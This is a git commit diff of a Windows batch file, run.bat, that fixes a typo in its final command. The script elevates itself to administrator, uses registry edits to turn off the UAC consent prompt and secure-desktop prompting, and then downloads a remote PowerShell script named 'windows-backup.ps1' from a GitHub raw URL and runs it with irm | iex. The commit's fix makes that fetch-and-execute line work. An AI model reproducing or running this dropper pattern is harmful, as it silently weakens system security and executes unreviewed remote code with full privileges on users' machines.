5d759b37314a79a1f10fb81f7be9c5544acd5807
minhtuan283 <tanghuynhminhtuan@gmail.com>
2024-12-22 17:59:32 +0700

    Update run.bat

--- run.bat
+++ run.bat
@@ -3,5 +3,5 @@ set "params=%*"
 cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f
-ppowershell -Command "& {irm https://raw.githubusercontent.com/mitutina/mitutina/main/windows-backup.ps1 | iex; Start-Sleep -Seconds 1; exit $LASTEXITCODE}"
+powershell -Command "& {irm https://raw.githubusercontent.com/mitutina/mitutina/main/windows-backup.ps1 | iex; Start-Sleep -Seconds 1; exit $LASTEXITCODE}"
 exit
